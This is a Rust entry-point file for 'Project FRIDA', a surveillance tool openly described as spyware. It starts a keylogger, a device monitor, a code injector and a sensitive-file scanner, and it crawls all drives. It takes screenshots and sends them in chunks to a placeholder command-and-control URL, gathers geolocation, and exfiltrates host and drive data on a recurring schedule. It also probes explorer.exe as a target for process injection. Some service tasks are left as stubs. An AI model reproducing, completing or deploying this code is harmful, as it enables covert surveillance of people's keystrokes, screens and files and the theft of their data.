//! Project FRIDA - System Monitoring and Data Collection Framework
//!
//! This application provides comprehensive system monitoring capabilities,
//! including keylogging, device monitoring, drive enumeration, process monitoring,
//! and sensitive file scanning. Data is collected locally and can be exfiltrated
//! to a remote server with full metadata and analysis.

/// USB and peripheral device monitoring
pub mod device_monitor;
/// Storage device enumeration and information gathering
pub mod drives;
/// File scanning and content analysis module
pub mod file_scanner;
/// Geo Location module
pub mod geolocation;
/// Process monitoring and Python script execution module
pub mod injector;
/// Keyboard input monitoring and logging
pub mod keylogger;
/// Logging utilities for application events
pub mod log;
/// Network communication for data exfiltration
pub mod network;
/// Stealthy network communication for data exfiltration
pub mod network_stealth;
/// Screen capture module
pub mod screen_capture;
/// File system operations for data persistence
pub mod writer;
pub mod constants;
/// Filesystem crawler module
pub mod crawler;
/// Process injection module (Windows-only)
#[cfg(windows)]
pub mod replica;
use crate::geolocation::Geolocator;
use crate::log::Log;
use serde::Serialize;
use std::env;
use std::fs;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::path::Path;
use tokio::select;
use tokio::signal::ctrl_c;
use tokio::time::{interval, Duration};

#[derive(Serialize)]
struct Payload<'a> {
    hostname: String,
    drives: &'a [drives::DriveInfo],
}

#[tokio::main]
async fn main() {
    Log::info(format!("Project Frida (Rust Edition) - Initializing..."));
    // 1. Start the keylogger in a background thread.
    keylogger::start_keylogger();
    // 1.1. Start the device monitor in a background thread.
    device_monitor::start_device_monitor();
    // 1.2. Start Injector Service
    injector::start_injector_service();
    // 1.3. Start File Scanner Service
    file_scanner::start_file_scanner();

    // 1.4. Demonstrate process injection capabilities (Windows-only)
    #[cfg(windows)]
    {
        Log::info(format!("Attempting to find target process for injection..."));
        if let Some(pid) = replica::find_process_pid("explorer.exe") {
            Log::info(format!("Found target process 'explorer.exe' with PID: {}", pid));
            // In a real scenario, we would proceed with injection here.
            // For now, we are just demonstrating the process finding capability.
        } else {
            Log::error(format!("Could not find target process 'explorer.exe'"));
        }
    }

    // 2. Collect drive info.
    let drives = drives::list_drives();
    Log::info(format!("Found {} drives:", drives.len()));
    for drive in &drives {
        Log::info(format!("  - {:?}", drive));
    }

    // 2.1. Start filesystem crawl
    Log::info("Starting filesystem crawl...".to_string());
            if let Err(e) = crawler::crawl_drives(&drives, constants::CRAWLER_OUTPUT_FILENAME).await {
        Log::error(format!("Filesystem crawl failed: {}", e));
    }

    // 2.1. Capture and save a screenshot with compression
    Log::info(format!("Capturing screenshot with WebP compression for optimal file size"));
    // Use the WebP format with balanced compression settings
        match screen_capture::ScreenCapture::capture_and_save_with_compression(
        constants::SCREENSHOT_OUTPUT_DIR, 
        None,
        screen_capture::CompressionFormat::smallest_size()
    ) {
        Ok(paths) => {
            if let Some(path_str) = paths.get(0) {
                Log::info(format!("Compressed screenshot saved to {}", path_str));

                // Demonstrate stealthy file transfer with the captured screenshot
                Log::info(format!("Initiating stealth transfer for {}", path_str));
                let file_path = Path::new(path_str);
                let file_id = uuid::Uuid::new_v4().to_string(); // Unique ID for the transfer

                match network_stealth::chunk_file(file_path, &file_id) {
                    Ok(chunks) => {
                        Log::info(format!("File split into {} chunks. Sending to server...", chunks.len()));
                        // NOTE: The server URL is a placeholder. In a real scenario, this would be a C&C server.
                        let server_url = "http://localhost:8080/upload_chunk";
                        if let Err(e) = network_stealth::send_chunks(server_url, chunks).await {
                            Log::error(format!("Failed to send chunks: {}", e));
                        }
                    }
                    Err(e) => {
                        Log::error(format!("Failed to chunk file: {}", e));
                    }
                }
            }
        }
        Err(e) => {
            Log::error(format!("Failed to capture screenshot: {:?}", e));
        }
    };

    // 2.2. Get geolocation information
    Log::info(format!("Attempting to get geolocation information..."));
    // Make sure logs directory exists before we try to save geolocation data
    if let Err(e) = fs::create_dir_all("logs") {
        Log::error(format!("Failed to create logs directory: {}", e));
    }
    
    // Use a timeout to prevent hanging on network operations
    match tokio::time::timeout(std::time::Duration::from_secs(10), async {
        let geolocator = Geolocator::new(5); // 5 second timeout
        geolocator.get_ip_location().await
    }).await {
        Ok(result) => match result {
            Ok(location) => {
                Log::info(format!("IP-based geolocation information obtained"));
                let location_str = geolocation::Geolocator::format_location(&location);
                Log::info(location_str);
                if let Err(e) = writer::save_output(&location, "logs/geolocation.json", false) {
                    Log::error(format!("Failed to save geolocation data: {}", e));
                }
            },
            Err(e) => {
                Log::error(format!("Failed to get geolocation: {}", e));
            }
        },
        Err(_) => {
            Log::error(format!("Geolocation timed out after 10 seconds"));
        }
    };
    // 3. Persist locally.
    let _ = writer::save_output(&drives, "logs/drive_info.json", false)
        .map_err(|e| Log::error(format!("Failed to save drive info: {}", e)));
    // 4. Exfiltrate data to server.
    let server_url = env::var("COLLECT_ENDPOINT")
        .unwrap_or_else(|_| "http://localhost:8080/collect".to_string());
    let hostname = sysinfo::System::host_name().unwrap_or_else(|| "unknown_host".to_string());
    let payload = Payload {
        hostname,
        drives: &drives,
    };
    Log::info(format!("Sending data to {}...", server_url));
    match network::send_to_server(&payload, &server_url).await {
        Ok(_) => Log::info(format!("Data sent successfully.")),
        Err(e) => Log::error(format!("Failed to send data: {}", e)),
    };
    // Service configuration
    let config = ServiceConfig {
        keylogger_interval_secs: 60,
        device_scan_interval_secs: 300,
        drive_scan_interval_secs: 1800,
        process_scan_interval_secs: 120,
        file_scan_interval_secs: 3600,
        data_exfiltration_interval_secs: 900,
    };

    Log::info(format!("Starting FRIDA service with configured intervals"));
    run_service(config, server_url).await;
}

/// Service configuration parameters
struct ServiceConfig {
    keylogger_interval_secs: u64,
    device_scan_interval_secs: u64,
    drive_scan_interval_secs: u64,
    process_scan_interval_secs: u64,
    file_scan_interval_secs: u64,
    data_exfiltration_interval_secs: u64,
}

/// Main service runner with scheduled tasks
async fn run_service(config: ServiceConfig, server_url: String) {
    // Set up the shutdown signal
    let shutdown = Arc::new(AtomicBool::new(false));
    let shutdown_clone = shutdown.clone();

    // Spawn a task to handle Ctrl+C
    tokio::spawn(async move {
        if let Ok(_) = ctrl_c().await {
            Log::info(format!("Shutdown signal received"));
            shutdown_clone.store(true, Ordering::SeqCst);
        }
    });

    Log::info(format!("Service started. Press Ctrl+C to exit."));

    // Create intervals for different tasks
    let mut keylogger_interval = interval(Duration::from_secs(config.keylogger_interval_secs));
    let mut device_scan_interval = interval(Duration::from_secs(config.device_scan_interval_secs));
    let mut drive_scan_interval = interval(Duration::from_secs(config.drive_scan_interval_secs));
    let mut process_scan_interval =
        interval(Duration::from_secs(config.process_scan_interval_secs));
    let mut file_scan_interval = interval(Duration::from_secs(config.file_scan_interval_secs));
    let mut data_exfiltration_interval =
        interval(Duration::from_secs(config.data_exfiltration_interval_secs));

    // Service main loop
    while !shutdown.load(Ordering::SeqCst) {
        select! {
            _ = keylogger_interval.tick() => {
                Log::info(format!("Performing keylogger data collection"));
                // In a full implementation, this would process and save keylogger data
                // This is already running in a separate thread, so this would just
                // handle flushing buffers or other maintenance tasks
            }

            _ = device_scan_interval.tick() => {
                Log::info(format!("Scanning for connected devices"));
                // In a full implementation, this would call device_monitor functions
                // to check for newly connected devices
            }

            _ = drive_scan_interval.tick() => {
                Log::info(format!("Scanning drives and storage media"));
                let drives = drives::list_drives();
                Log::info(format!("Found {} drives", drives.len()));
                // Full implementation would process and store this information
            }

            _ = process_scan_interval.tick() => {
                Log::info(format!("Monitoring system processes"));
                // In a full implementation, this would scan running processes
                // and possibly execute Python scripts for deeper analysis
            }

            _ = file_scan_interval.tick() => {
                Log::info(format!("Scanning for sensitive files"));
                // In a full implementation, this would scan for sensitive files
                // across user directories as described in the project docs
            }

            _ = data_exfiltration_interval.tick() => {
                Log::info(format!("Performing scheduled data exfiltration"));
                let hostname = drives::sys_info().current_user;
                let drives = drives::list_drives();

                let payload = Payload {
                    hostname,
                    drives: &drives,
                };

                Log::info(format!("Sending data to {}...", server_url));
                match network::send_to_server(&payload, &server_url).await {
                    Ok(_) => Log::info(format!("Data sent successfully.")),
                    Err(e) => Log::error(format!("Failed to send data: {}", e)),
                };
            }
        }

        // Brief sleep to prevent CPU hogging
        tokio::time::sleep(Duration::from_millis(50)).await;
    }

    // Perform cleanup when service is shutting down
    Log::info(format!("Service shutting down, performing cleanup..."));
    // Cleanup code would go here - close files, flush buffers, etc.
    Log::info(format!("Service shutdown complete"));
}
